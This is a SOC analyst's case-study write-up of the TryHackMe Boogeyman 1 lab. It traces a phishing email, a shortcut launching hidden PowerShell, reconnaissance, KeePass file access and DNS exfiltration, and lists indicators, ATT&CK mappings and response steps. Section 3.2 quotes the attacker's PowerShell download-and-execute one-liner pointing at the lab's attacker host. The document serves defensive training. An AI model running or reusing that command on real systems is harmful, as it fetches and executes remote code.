# TryHackMe — Boogeyman 1
## SOC L1 Phishing and Malware Investigation Case Study

**Platform:** TryHackMe  
**Investigation type:** Phishing, endpoint compromise, credential/data discovery, and DNS-based exfiltration  
**Role perspective:** SOC Analyst Level 1  
**Learning status:** Completed with video walkthrough assistance  
**Report status:** Portfolio write-up based on investigation notes; some evidence references and exact timestamps were not retained.

> **Transparency note:** This room was completed with the help of a video walkthrough. This report documents the attack chain and findings learned from the exercise; it should not be represented as a fully independent investigation. The next case study, Boogeyman 2, is intended for independent practice.

## 1. Executive Summary

This investigation examined a phishing-led compromise involving an employee of Quick Logistics. The initial lure was an email carrying an archive named `Invoice.zip`. The archive contained a shortcut that launched hidden PowerShell and retrieved a remote script from an attacker-controlled host. Follow-on activity included host reconnaissance, discovery and access of locally stored information, and DNS-based data exfiltration.

The investigation notes identify the victim mailbox as `julianne.westcott@hotmail.com`, a suspicious sender address of `agriffin@bpakcaging.xyz`, and a related payload host under `bpakcaging.xyz`. The observed chain also included a KeePass database file, `protected_data.kdbx`, and DNS communication to `167.71.211.113`.

**Assessment:** Phishing-led endpoint compromise with suspicious data collection and suspected exfiltration. The case warrants escalation to incident response in a real SOC environment.

## 2. Scope and Objectives

- Review the phishing email and identify sender, recipient, and attachment.
- Inspect the archive and shortcut without executing the payload.
- Reconstruct the PowerShell download and execution chain.
- Identify reconnaissance and data-access activity.
- Investigate DNS traffic for signs of encoded data transfer.
- Document indicators, attack techniques, and response recommendations.

## 3. Key Findings

### 3.1 Phishing email

| Field | Finding |
|---|---|
| Victim | `julianne.westcott@hotmail.com` |
| Sender address observed | `agriffin@bpakcaging.xyz` |
| Attachment | `Invoice.zip` |
| Related sender-signature domain | `bpackaging.xyz` |

**Analyst note:** The sender address and the signature shown in the email used similar but different domain spellings (`bpakcaging.xyz` versus `bpackaging.xyz`). This mismatch is a useful phishing indicator and should be validated against the original message headers.

### 3.2 Shortcut and PowerShell execution

The investigation identified the shortcut:

```text
Invoice_20230103.lnk
```

The observed PowerShell command used a .NET WebClient download-string pattern to retrieve a remote script:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

This behavior is consistent with downloading and executing remote PowerShell content. The command should be treated as malicious in this incident context.

### 3.3 Reconnaissance and local data discovery

The investigation notes recorded host reconnaissance using Seatbelt and subsequent access to a Sticky Notes database using a utility named `sq3.exe`. The database filename observed was:

```text
plum.sqlite
```

This activity is relevant because attackers commonly enumerate endpoints and search local data after gaining execution.

### 3.4 Sensitive file identified

A KeePass database was identified at:

```text
C:\Users\j.westcott\Documents\protected_data.kdbx
```

The investigation notes indicate that this file was accessed and later involved in the suspected exfiltration chain. Do not publish any recovered passwords, secrets, or personal information from the lab.

### 3.5 Network communication and DNS exfiltration

The investigation identified these network indicators:

| Indicator | Observed context |
|---|---|
| `files.bpakcaging.xyz` | Remote PowerShell script host; HTTP port 80 |
| `cdn.bpakcaging.xyz` | Related command-and-control domain |
| `167.71.211.113` | Destination IP associated with DNS-based transfer |
| TCP port `8080` | C2 communication port noted during investigation |
| DNS / `nslookup` | Used in the data-transfer activity |

The notes describe data being encoded and sent through DNS queries using `nslookup`. DNS tunneling can allow data to be transferred through DNS request patterns and may evade controls that focus only on conventional web traffic.

**Evidence limitation:** Exact packet numbers, DNS query labels, timestamps, and complete request/response records were not retained in the notes used for this report. The destination and technique are therefore presented as investigation findings, not as a packet-by-packet forensic reconstruction.

## 4. High-Level Attack Timeline

This is a logical sequence reconstructed from the available investigation notes. It is not a timestamp-verified timeline.

1. Victim receives a phishing email with `Invoice.zip`.
2. The archive contains `Invoice_20230103.lnk`.
3. The shortcut launches hidden PowerShell.
4. PowerShell retrieves remote content from `files.bpakcaging.xyz/update`.
5. Host reconnaissance is performed, including Seatbelt activity.
6. A utility named `sq3.exe` is used in connection with `plum.sqlite`.
7. The KeePass database `protected_data.kdbx` is identified and accessed.
8. DNS-based transfer activity using `nslookup` is observed, with `167.71.211.113` identified as the destination.

## 5. Indicator Register

| Type | Indicator | Context |
|---|---|---|
| Email | `agriffin@bpakcaging.xyz` | Phishing sender |
| Email | `julianne.westcott@hotmail.com` | Victim mailbox |
| File | `Invoice.zip` | Phishing attachment |
| File | `Invoice_20230103.lnk` | Shortcut associated with execution |
| Domain | `files.bpakcaging.xyz` | Remote PowerShell content host |
| URL | `http://files.bpakcaging.xyz/update` | Remote script retrieval |
| Domain | `cdn.bpakcaging.xyz` | Related C2 domain |
| File | `plum.sqlite` | Sticky Notes database |
| File | `protected_data.kdbx` | KeePass database |
| Utility | `Seatbelt` | Host reconnaissance |
| Utility | `sq3.exe` | SQLite database access |
| Utility | `nslookup` | DNS-based transfer activity |
| IP address | `167.71.211.113` | Destination associated with DNS exfiltration |
| Port | `80` | Payload retrieval over HTTP |
| Port | `8080` | C2 communication noted in investigation |

Defang indicators before publishing to threat-sharing platforms or using them in production controls. Validate any indicator against current telemetry before blocking.

## 6. MITRE ATT&CK Mapping

The following mappings are based on the behaviors recorded in the investigation notes. They should be refined if the original artifacts are re-examined.

| Tactic | Technique | ID | Case evidence |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Email with `Invoice.zip` |
| Execution | User Execution: Malicious File | T1204.002 | User-opened shortcut / attachment chain |
| Execution | PowerShell | T1059.001 | PowerShell download-and-execute pattern |
| Command and Control | Ingress Tool Transfer | T1105 | Remote script retrieval |
| Discovery | System Information Discovery | T1082 | Host reconnaissance activity |
| Collection | Data from Local System | T1005 | Local database and KeePass file discovery |
| Command and Control | Application Layer Protocol: DNS | T1071.004 | DNS-based communication |
| Exfiltration | Exfiltration Over Alternative Protocol | T1048 | DNS-based data transfer behavior |

Technique mappings are analytical classifications, not proof of every sub-technique or specific attacker identity.

## 7. SOC L1 Assessment

**Classification:** Phishing-led malware / endpoint compromise  
**Suggested priority:** High, subject to the organisation's severity matrix  
**Escalation:** SOC L2 / Incident Response

**Rationale:** The evidence chain includes a suspicious email attachment, shortcut-triggered PowerShell, remote content retrieval, endpoint reconnaissance, access to sensitive local data, and suspected DNS-based exfiltration.

A SOC L1 analyst should preserve the original email, endpoint logs, process execution evidence, and PCAP; document the observed indicators; and escalate rather than attempting unapproved remediation.

## 8. Recommended Response Actions

1. Isolate the affected endpoint according to the organisation's incident-response procedure.
2. Preserve the original email, archive metadata, shortcut, endpoint logs, and network capture.
3. Identify and scope other endpoints that contacted the related domains or destination IP.
4. Review PowerShell execution, process ancestry, scheduled tasks, and persistence locations.
5. Determine whether credentials or password-manager data were exposed; follow the organisation's credential-reset and secrets-rotation procedures.
6. Block confirmed malicious indicators through approved controls after validation.
7. Hunt for DNS tunneling patterns and unusual high-entropy or oversized DNS query labels.
8. Rebuild or restore the endpoint only after evidence preservation and eradication validation.

## 9. Lessons Learned

- Email sender-domain lookalikes and attachment-based lures are important phishing indicators.
- Shortcut files can act as launchers for hidden script execution.
- PowerShell download-and-execute patterns deserve careful triage and process-tree correlation.
- Local databases and password-manager files are high-value targets after endpoint compromise.
- DNS can be abused as a covert communication and exfiltration channel.
- A useful SOC report separates directly observed facts from inferred attack stages and clearly records missing evidence.

## 10. Evidence Limitations

This portfolio report was prepared from the investigation notes retained after completing the training room with video walkthrough assistance. The following details were not preserved in sufficient form for independent verification:

- Original email file and complete headers
- Cryptographic hashes of the attachment and payloads
- Exact timestamps and event record identifiers
- Full process tree, command-line evidence, and PID correlation
- Exact DNS query names and packet/frame references
- Full contents and validated hash of recovered artifacts

These omissions are stated transparently. No credentials, archive passwords, private data, or executable malware are included.

## 11. Conclusion

The Boogeyman 1 exercise demonstrates a phishing-led intrusion chain involving a malicious archive and shortcut, PowerShell-based remote content retrieval, host reconnaissance, discovery of sensitive local data, and DNS-based exfiltration behavior.

From a SOC L1 perspective, the key skills practiced include email triage, suspicious script recognition, endpoint investigation, network indicator identification, ATT&CK mapping, evidence-aware reporting, and incident escalation.

## References

- [TryHackMe — Boogeyman](https://tryhackme.com/room/boogeyman)
- [MITRE ATT&CK](https://attack.mitre.org/)

**Disclaimer:** Educational case study based on an authorized TryHackMe lab. This is not a real-world attribution or a complete forensic report.
